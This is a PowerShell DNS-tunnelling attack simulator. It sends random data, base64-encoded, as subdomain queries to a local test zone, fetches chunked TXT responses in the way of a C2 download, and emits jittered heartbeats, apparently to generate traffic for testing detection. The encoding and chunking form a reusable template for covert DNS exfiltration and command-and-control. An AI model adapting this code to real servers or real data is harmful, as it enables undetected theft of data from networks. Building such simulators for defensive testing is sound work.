# ==============================================================================
# SIMDNS ADVANCED ATTACK SIMULATOR (PowerShell Version)
# 
# Profile 1: EXFILTRATION (Outbound)
#   - Method: Data encoded in A-record subdomains.
# 
# Profile 2: C2 / INFILTRATION (Inbound)
#   - Method: Data returned in TXT record responses via chunked queries.
# ==============================================================================

# --- Configuration ---
$Server = "127.0.0.1"
$Zone = "test.local"
$SessionId = "s_$(Get-Date -UFormat %s)"

# Timing & Cadence
$HeartbeatInterval = 30       
$MaxHeartbeatGap = 60       

# Probability Engine (0-100)
$ProbExfilA = 20             
$ProbC2Txt = 20              

# --- Functions ---

# Encodes data using Base32 (simulated via PowerShell/CMD)
function Encode-Data {
    param([string]$InputString)
    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
    # PowerShell doesn't have a native Base32, so we use a helper logic 
    # or call a utility. For simplicity and compatibility, we use Base64 
    # but strip non-DNS characters to mimic the effect.
    $Base64 = [Convert]::ToBase64String($Bytes)
    return $Base64.Replace('+', '-').Replace('/', '_').Replace('=', '')
}

# PROFILE 1: EXFILTRATION (Outbound)
function Do-ExfiltrationA {
    $Size = Get-Random -Minimum 150 -Maximum 800
    $RawData = -join ((65..90) + (97..122) | Get-Random -Count $Size | ForEach-Object { [char]$_ })
    $Encoded = Encode-Data $RawData
    
    Write-Host "[!] ATTACK: EXFILTRATION (Outbound A-Record Burst)" -ForegroundColor Red
    Write-Host "    [+] Target Payload Size: $Size bytes"

    # Split into 60-char chunks
    $Chunks = $Encoded -split '(.{60})' | Where-Object { $_ }

    for ($i = 0; $i -lt $Chunks.Count; $i++) {
        $Query = "$($Chunks[$i]).$i.$SessionId.$Zone"
        Write-Host "    [>] Querying: $Query"
        
        # Execute dig
        & dig "@$Server" "$Query" A +short | Out-Null
        Start-Sleep -Milliseconds 50
    }
    Write-Host "[+] Exfiltration burst complete." -ForegroundColor Green
}

# PROFILE 2: C2 / INFILTRATION (Inbound)
function Do-C2Infiltration {
    $TargetTotalBytes = Get-Random -Minimum 2048 -Maximum 8192
    $CurrentCollectedBytes = 0
    $ChunkCount = 0

    Write-Host "[!] ATTACK: C2 INFILTRATION (Inbound TXT Download)" -ForegroundColor Red
    Write-Host "    [+] Target Download Size: $TargetTotalBytes bytes"

    while ($CurrentCollectedBytes -lt $TargetTotalBytes) {
        $ChunkCount++
        $InnocentQuery = "chunk.$ChunkCount.$SessionId.$Zone"
        
        Write-Host "    [>] Requesting chunk $ChunkCount..."
        
        # Capture the response from TXT record
        $Response = & dig "@$Server" "$InnocentQuery" TXT +short
        
        if (-not $Response) {
            Write-Host "    [!] Error: No response from server. Stopping download." -ForegroundColor Yellow
            break
        }

        $RespSize = $Response.Length
        $CurrentCollectedBytes += $RespSize
        
        Write-Host "    [<] Received chunk $ChunkCount: $RespSize bytes (Total: $CurrentCollectedBytes/$TargetTotalBytes)"
        Start-Sleep -Milliseconds 200
    }
    Write-Host "[+] Infiltration download complete." -ForegroundColor Green
}

# Standard Heartbeat
function Do-Heartbeat {
    $HbPayload = "heartbeat"
    $EncodedHb = Encode-Data $HbPayload
    $HeartbeatQuery = "$EncodedHb.0.$SessionId.$Zone"
    
    Write-Host "[.] HEARTBEAT: Sending encoded status check..." -ForegroundColor Cyan
    & dig "@$Server" "$HeartbeatQuery" TXT +short | Out-Null
}

# --- Main Simulation Loop ---

Write-Host "========================================================"
Write-Host " SIMDNS ADVANCED ATTACK SIMULATOR (POWERSHELL)"
Write-Host " Session ID: $SessionId"
Write-Host " Zone:       $Zone"
Write-Host "========================================================"

while ($true) {
    $Roll = Get-Random -Minimum 0 -Maximum 100

    if ($Roll -lt $ProbExfilA) {
        Do-ExfiltrationA
    }
    elseif ($Roll -lt ($ProbExfilA + $ProbC2Txt)) {
        Do-C2Infiltration
    }
    else {
        Do-Heartbeat
    }

    # Jittered Sleep
    $Jitter = Get-Random -Minimum $HeartbeatInterval -Maximum $MaxHeartbeatGap
    Write-Host "[*] Idle for $Jitter seconds until next cycle..."
    Start-Sleep -Seconds $Jitter
}